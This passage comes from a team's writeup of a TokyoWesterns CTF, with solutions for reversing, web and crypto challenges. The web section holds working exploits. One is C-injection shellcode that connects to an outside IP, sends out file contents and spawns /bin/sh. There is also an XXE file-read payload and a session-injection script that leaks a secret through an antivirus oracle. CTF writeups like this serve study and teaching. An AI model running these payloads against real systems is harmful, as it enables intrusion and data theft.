    v59 = (svm_heap[1] + input1) & (2 ** 32 - 1)
    v70 = (svm_heap[2] + rol(v59 ^ v58, v59 & 0x1F)) & (2 ** 32 - 1)
    v71 = (svm_heap[3] + rol(v70 ^ v59, v70 & 0x1F)) & (2 ** 32 - 1)
    v72 = (svm_heap[4] + rol(v71 ^ v70, v71 & 0x1F)) & (2 ** 32 - 1)
    v73 = (svm_heap[5] + rol(v72 ^ v71, v72 & 0x1F)) & (2 ** 32 - 1)
    v74 = (svm_heap[6] + rol(v73 ^ v72, v73 & 0x1F)) & (2 ** 32 - 1)
    v75 = (svm_heap[7] + rol(v74 ^ v73, v74 & 0x1F)) & (2 ** 32 - 1)
    v76 = (svm_heap[8] + rol(v75 ^ v74, v75 & 0x1F)) & (2 ** 32 - 1)
    v77 = (svm_heap[9] + rol(v76 ^ v75, v76 & 0x1F)) & (2 ** 32 - 1)
    v78 = (svm_heap[10] + rol(v77 ^ v76, v77 & 0x1F)) & (2 ** 32 - 1)
    v79 = (svm_heap[11] + rol(v78 ^ v77, v78 & 0x1F)) & (2 ** 32 - 1)
    v80 = (svm_heap[12] + rol(v79 ^ v78, v79 & 0x1F)) & (2 ** 32 - 1)
    v81 = (svm_heap[13] + rol(v80 ^ v79, v80 & 0x1F)) & (2 ** 32 - 1)
    v82 = (svm_heap[14] + rol(v81 ^ v80, v81 & 0x1F)) & (2 ** 32 - 1)
    v83 = (svm_heap[15] + rol(v82 ^ v81, v82 & 0x1F)) & (2 ** 32 - 1)
    v84 = (svm_heap[16] + rol(v83 ^ v82, v83 & 0x1F)) & (2 ** 32 - 1)
    v85 = (svm_heap[17] + rol(v84 ^ v83, v84 & 0x1F)) & (2 ** 32 - 1)
    v86 = (svm_heap[18] + rol(v85 ^ v84, v85 & 0x1F)) & (2 ** 32 - 1)
    v87 = (svm_heap[19] + rol(v86 ^ v85, v86 & 0x1F)) & (2 ** 32 - 1)
    v88 = (svm_heap[20] + rol(v87 ^ v86, v87 & 0x1F)) & (2 ** 32 - 1)
    v89 = (svm_heap[21] + rol(v88 ^ v87, v88 & 0x1F)) & (2 ** 32 - 1)
    v90 = (svm_heap[22] + rol(v89 ^ v88, v89 & 0x1F)) & (2 ** 32 - 1)
    v91 = (svm_heap[23] + rol(v90 ^ v89, v90 & 0x1F)) & (2 ** 32 - 1)
    cipher0 = (svm_heap[24] + rol(v91 ^ v90, v91 & 0x1F)) & (2 ** 32 - 1)
    cipher1 = (svm_heap[25] + rol(cipher0 ^ v91, cipher0 & 0x1F)) & (2 ** 32 - 1)
    print hex(cipher0), hex(cipher1)
```

as we have extracted the table for each round, we can solve the input from cipher using z3, with pretty much the same code as the encryption, this will reveal the flag:

```python
def solve(table, cipher):
    solver = Solver()
    rol = lambda x, y: (x << y) | (LShR(x, 32 - y))
    svm_heap = [BitVecVal(x, 32) for x in table]
    input0 = BitVec("input0", 32)
    input1 = BitVec("input1", 32)
    v58 = svm_heap[0] + input0
    v59 = svm_heap[1] + input1
    v70 = svm_heap[2] + rol(v59 ^ v58, v59 & 0x1F)
    v71 = svm_heap[3] + rol(v70 ^ v59, v70 & 0x1F)
    v72 = svm_heap[4] + rol(v71 ^ v70, v71 & 0x1F)
    v73 = svm_heap[5] + rol(v72 ^ v71, v72 & 0x1F)
    v74 = svm_heap[6] + rol(v73 ^ v72, v73 & 0x1F)
    v75 = svm_heap[7] + rol(v74 ^ v73, v74 & 0x1F)
    v76 = svm_heap[8] + rol(v75 ^ v74, v75 & 0x1F)
    v77 = svm_heap[9] + rol(v76 ^ v75, v76 & 0x1F)
    v78 = svm_heap[10] + rol(v77 ^ v76, v77 & 0x1F)
    v79 = svm_heap[11] + rol(v78 ^ v77, v78 & 0x1F)
    v80 = svm_heap[12] + rol(v79 ^ v78, v79 & 0x1F)
    v81 = svm_heap[13] + rol(v80 ^ v79, v80 & 0x1F)
    v82 = svm_heap[14] + rol(v81 ^ v80, v81 & 0x1F)
    v83 = svm_heap[15] + rol(v82 ^ v81, v82 & 0x1F)
    v84 = svm_heap[16] + rol(v83 ^ v82, v83 & 0x1F)
    v85 = svm_heap[17] + rol(v84 ^ v83, v84 & 0x1F)
    v86 = svm_heap[18] + rol(v85 ^ v84, v85 & 0x1F)
    v87 = svm_heap[19] + rol(v86 ^ v85, v86 & 0x1F)
    v88 = svm_heap[20] + rol(v87 ^ v86, v87 & 0x1F)
    v89 = svm_heap[21] + rol(v88 ^ v87, v88 & 0x1F)
    v90 = svm_heap[22] + rol(v89 ^ v88, v89 & 0x1F)
    v91 = svm_heap[23] + rol(v90 ^ v89, v90 & 0x1F)
    cipher0 = svm_heap[24] + rol(v91 ^ v90, v91 & 0x1F)
    cipher1 = svm_heap[25] + rol(cipher0 ^ v91, cipher0 & 0x1F)
    solver.add(cipher0 == cipher[0])
    solver.add(cipher1 == cipher[1])
    print solver.check()
    model = solver.model()
    return (hex(int(str(model[input0])))[2:].decode('hex') +
            hex(int(str(model[input1])))[2:].decode('hex'))
```

### ebc

we are given a efi byte code executable, but the IDA processor for EBC is total crap. we used https://github.com/yabits/ebcvm instead to get disassemble from the binary. reversing shows that the main logic start at 0x40111c, the program:

+ 1: get user input to global storage
+ 2: get xor_key from 0x40207a and xor decrypt a bunch of code, write to 0x401354
+ 3: call to 0x401354 with part of input, check the result
+ 4: update xor_key at 0x40207a, according to the input
+ 5: jump back to 2 with different encrypted code and xor_key, for 4 times

note that for the 4th time, update key first before call to 0x401354, and pass both input and key to 0x401354 and check result.

so there are 4 encrypted code segments responsible for check 4 8-bytes inputs, the first segment can be decrypted using the initial xor_key at 0x40207a. but the rest of decryption using the updated xor_key which we did not know how. the update process is done by `CALLEXa @R3 (+40, +24)`, which is native code and we dont know how to get the actual code. 

before we realize the update process is actually key=crc32(8-bytes input), we found that the decrypted code segment fetch the first argument, the 8-bytes input, by `60 81 02 10   MOVqw R1, @R0 (+2, +0)`. we assume every decrypted code segment starts with `60 81 02 10` and xor with the encrypted the data to get the xor_key, which turns out to be correct.

```python
encs = [
    [0x402114, 0x401354, 0x40210c, 0x40207a,],
    [0x4023dc, 0x401354, 0x4023d4, 0x40207a,],
    [0x402b44, 0x401354, 0x402b3c, 0x40207a,],
    [0x40337c, 0x401354, 0x403374, 0x40207a,],
]

origin = open('ebc', 'rb').read()
data_offset = 0x402114 - 0xf14
code_offset = 0x400e00

for j in xrange(len(encs)):
    start, _, size, key = map(lambda x: x - data_offset, encs[j])
    target = encs[j][1] - code_offset
    size = u32(origin[size:size + 4])

    encfirstins = u32(origin[start: start + 4])
    decfirstins = u32('\x60\x81\x02\x10')
    xor_key = decfirstins ^ encfirstins

    plain = ''
    for i in xrange(0, size, 4):
        c = u32(origin[start + i: start + i + 4])
        c ^= xor_key
        plain += p32(c)

    print hex(target), hex(size)

    binfile = 'decrypt/dec%d' % j
    asmfile = 'decrypt/dec%d.txt' % j

    out = open(binfile, 'wb')
    out.write(origin[:0x200])   # header
    out.write(plain)            # code entry
    out.write(origin[0x200 + size:])    # the rest
    out.close()

    os.system('./ebcdisas %s > %s' % (binfile, asmfile))
```

for every decrypted code segment we convert it to x86 assembly and solve the constraint by angr. the first 3 works fine, but the last one shows more than one solution. digging deeper, we found that the last one did not only check the input, but also the updated_key, thats where we realize the update is crc32. so we add more contraint to crc32(input) and finally get the result.



## Web

### Oneline Calc

In this challenge, we are given an API to calculate a expression modulo 256: http://olc.chal.ctf.westerns.tokyo/calc.php?formula=1-1
After trying with '1'(49) and "1"(132), we guessed the backend should not be php or python, so we tried to parse comma expression, expression with type casting to it and they all worked, which means the backend might be C/C++, so we try to use comma expression to read files and even get a reverse shell.
`http://olc.chal.ctf.westerns.tokyo/calc.php?formula=(mmap(0x80000000,4096,7,50,0xFFFFFFFF,0),fread((char*)(0x80000000),1024,1,fopen(%22/etc/passwd%22,%22r%22)),*(char*)0x80000000);//`

```python
#!/usr/bin/env python
# coding:utf-8

import requests
from pwn import *

context.arch = 'amd64'

addr = 0xdead0000
size = 0x10000
shellcode = asm(shellcraft.connect('139.224.220.67', 6378) +
    shellcraft.mmap(addr, size, 7, 50, 0xFFFFFFFF, 0) +
    shellcraft.open(args['F'], 4) +
    # shellcraft.lseek(5, addr) +
    shellcraft.read(5, addr, size) +
    # shellcraft.open(addr, 4) +
    # '''
    # mov rax, [rsp + 0x30]
    # and rax, 0xfffffffffffff000
    # mov r15, rax
    # mov qword ptr [0xdead0000], rax
    # ''' +
    # shellcraft.read(6, addr, size) +
    # shellcraft.write(3, 'r15', size) +
    # shellcraft.write(3, 'r15', size) +
    shellcraft.write(3, addr, size) +
    # shellcraft.dup2(3, 1) +
    # shellcraft.dup2(3, 0) +
    shellcraft.execve('/bin/sh').replace('SYS_execve', '520') +
'''

ret
''')

payload = r'(mmap(0x80000000,4096,7,50,0xFFFFFFFF,0),memcpy((char*)(0x80000000),"\x{}",{}),((int(*)(void))0x80000000)())'
payload = payload.format(r'\x'.join(group(2, enhex(shellcode))), len(shellcode))
print payload
params = dict(formula=payload)

res = requests.get('http://olc.chal.ctf.westerns.tokyo/calc.php', params=params)
print res.content
```

But we found that we cannot read the source code due to the privilege control in `run`, a binary in which our binary is executed.
Because of this limit, we must read the file in compile time, but it seems that in C we cannot read an arbitrary file to a string especially when we can't use pound sign in the formula until we find .incbin in Gnu Assembler.
By using the following formula, we can get the first byte of the source code:
`http://olc.chal.ctf.westerns.tokyo/calc.php?formula=0;__asm__(%22jmp%20main1\nsource:\n.incbin%20\%22/srv/olc/public/calc.php\%22\nmain1:%22);extern%20const%20void%20*source;return%20*((char%20*)%26source%2b0);`
Then we only need to combine this formula with the previous shellcode to write the result to socket.
`
http://olc.chal.ctf.westerns.tokyo/calc.php?formula=0;__asm__(%22jmp%20main1\nsource:\n.incbin%20\%22/srv/olc/public/calc.php\%22\nmain1:\n%22);extern%20const%20void*%20source;mmap(0x80000000,4096,7,50,0xFFFFFFFF,0);mmap(0xdead0000,4096,7,50,0xFFFFFFFF,0);memcpy((char*)(0xdead0000),%26source,1024);memcpy((char*)(0x80000000),%22\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x48\x89\xc5\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x03\x01\x08\x1c\x72\x9e\x3a\xfa\x48\x31\x04\x24\x6a\x2a\x58\x48\x89\xef\x6a\x10\x5a\x48\x89\xe6\x0f\x05\x6a\x03\x5f\x31\xd2\xb6\x10\xbe\x01\x01\x01\x01\x81\xf6\x01\x01\xac\xdf\x6a\x01\x58\x0f\x05\x48\xc7\xc0\x0b\x00\x00\x00\xc3%22,85);%20((int(*)(void))0x80000000)();
`


### j2x2j

Simple XXE.

```xml=
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/index.php" >]>
<root>
     <content>&xxe;</content>
</root>
```

Read the source code then read flag.php.

### PHP Note

Author has public his  WCTF challenge's writeup. In this challenge, we could found that the server is IIS and lives in Windows. We could use the windows defender oracle technique.

For this challenge, we could affect the file system by PHP session. In general, php session is in the format below:

```
realname|s:20:"11321321 31232131231";nickname|s:6:"312312";secret|s:32:"758db368428527f04f80bc283d08ff│    r_addend = 0x55002009d93d8d48
61";
```

We could control the realname and nickname, out target is to leak the secret, so we need to make the nickname or realname's position after the secret. In the code, we could find that:

```php
$_SESSION['realname'] = $realname;
        if (!empty($nickname)) {
            $_SESSION['nickname'] = $nickname;
        }
        $_SESSION['secret'] = gen_secret($nickname);
```

The first time we login without nickname and the second time with the nickname, we will make the position of nickname in the session file after the secret. Now all conditions satisfied, just leak secret byte by byte:

```python
import requests
import string
import random

url = "http://phpnote.chal.ctf.westerns.tokyo/?action={}"
# url = "http://localhost/test.php?action={}"

def randstr(n=10):
    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
    return ''.join([random.choice(chars) for _ in range(n)])

def login(nickname, realname, sess_id):
    headers = {
        "Cookie": "PHPSESSID={}; path=/".format(sess_id)
    }
    requests.post(url.format("login"), headers=headers, data={'realname': realname})
    requests.post(url.format("login"), headers=headers, data={'realname': realname, 'nickname': nickname})

def get_index(sess_id):
    headers = {
        "Cookie": "PHPSESSID={}; path=/".format(sess_id)
    }
    req = requests.get(url.format('index'), headers=headers)
    return req.text.find('Welcome') != -1

def leak(idx, sess_id):
    l, h = 0, 0x100
    while h - l > 1:
        m = (h + l) // 2
        p = '''<script>f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));</script><body>'''
        p = string.Template(p).substitute({'idx': idx, 'c': str(m)})
        sess_id = randstr()
        login("</body>", p, sess_id)
        if get_index(sess_id):
            h = m
        else:
            l = m
    return chr(l)

result = ""
for i in range(0, 50):
    x = leak(i, randstr())
    print(x)
    result += x

print(result)
```

and we could use the leaked result to calculate the hmac and get flag.

## Crypto

### real-baby-rsa

RSA with a plain space of only one byte, so we can brute force to find the plain text.

```python
# Public Parameters
N = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091
e = 65537

with open('output', 'rb') as f:
    content = f.readlines()

flag = ''

for line in content:
    for i in range(128):
        if pow(i, e, N) == int(line):
            flag += chr(i)

print flag
```

### Simple Logic

The ruby code implements a cipher using only add and xor, which has a very weak diffusion. To be specific, if we change a bit in plain text, the lower bits in corresponding cipher text won't be changed, so we can brute force from LSB to MSB to find the key.

```python
ROUNDS = 765
BITS = 128


def encrypt(msg, key, mask):
    enc = msg
    for _ in range(ROUNDS):
        enc = (enc + key) & mask
        enc = enc ^ key
    return enc


def decrypt(msg, key):
    enc = msg
    mask = (1 << BITS) - 1
    for _ in range(ROUNDS):
        enc = enc ^ key
        enc = (enc - key) & mask
    return enc


plains = [0x029abc13947b5373b86a1dc1d423807a,
          0xeeb83b72d3336a80a853bf9c61d6f254, 0x7a0e5ffc7208f978b81475201fbeb3a0, 0xc464714f5cdce458f32608f8b5e2002e, 0xf944aaccf6779a65e8ba74795da3c41d, 0x552682756304d662fa18e624b09b2ac5]
encs = [0xb36b6b62a7e685bd1158744662c5d04a, 0x614d86b5b6653cdc8f33368c41e99254, 0x292a7ff7f12b4e21db00e593246be5a0,
        0x64f930da37d494c634fa22a609342ffe, 0xaa3825e62d053fb0eb8e7e2621dabfe7, 0xf2ffdf4beb933681844c70190ecf60bf]

candidates = [0]
for bits in range(0, 128, 8):
    mask = (1 << (bits+8)) - 1
    for partial in candidates:
        tmp_candidates = []
        for key in range(0xff):
            key = (key << bits) + partial
            success = True
            for a, b in zip(plains, encs):
                if encrypt(a & mask, key, mask) != b & mask:
                    success = False
                    break
            if success:
                tmp_candidates.append(key)
        if tmp_candidates:
            candidates = tmp_candidates
            break

print "TWCTF{%x}" % (decrypt(0x43713622de24d04b9c05395bb753d437, candidates[0]))
```
### Happy!

The ruby code implements Power Prime RSA and using CRT to decrypt. Pubkey `n,e` is given but `cf` is also mistakenly included. With this we can construct polynomial and using coppersmith method to factor `n` as below.

```
n = n=5452318773620154613572502669913080727339917760196646730652258556145398937256752632887555812737783373177353194432136071770417979324393263857781686277601413222025718171529583036919918011865659343346014570936822522629937049429335236497295742667600448744568785484756006127827416640477334307947919462834229613581880109765730148235236895292544500644206990455843770003104212381715712438639535055758354549980537386992998458659247267900481624843632733660905364361623292713318244751154245275273626636275353542053068704371642619745495065026372136566314951936609049754720223393857083115230045986813313700617859091898623345607326632849260775745046701800076472162843326078037832455202509171395600120638911
e = 65537
cf = 25895436290109491245101531425889639027975222438101136560069483392652360882638128551753089068088836092997653443539010850513513345731351755050869585867372758989503310550889044437562615852831901962404615732967948739458458871809980240507942550191679140865230350818204637158480970417486015745968144497190368319745738055768539323638032585508830680271618024843807412695197298088154193030964621282487334463994562290990124211491040392961841681386221639304429670174693151

PR.<x> = PolynomialRing(Zmod(n))
f = x*cf-1
f = f.monic()

x0 = f.small_roots(X=2^766, beta=0.4)[0]  # find root < 2^kbits with factor = n
print x0
```

## Misc

### Welcome!!

Copy-paste!!
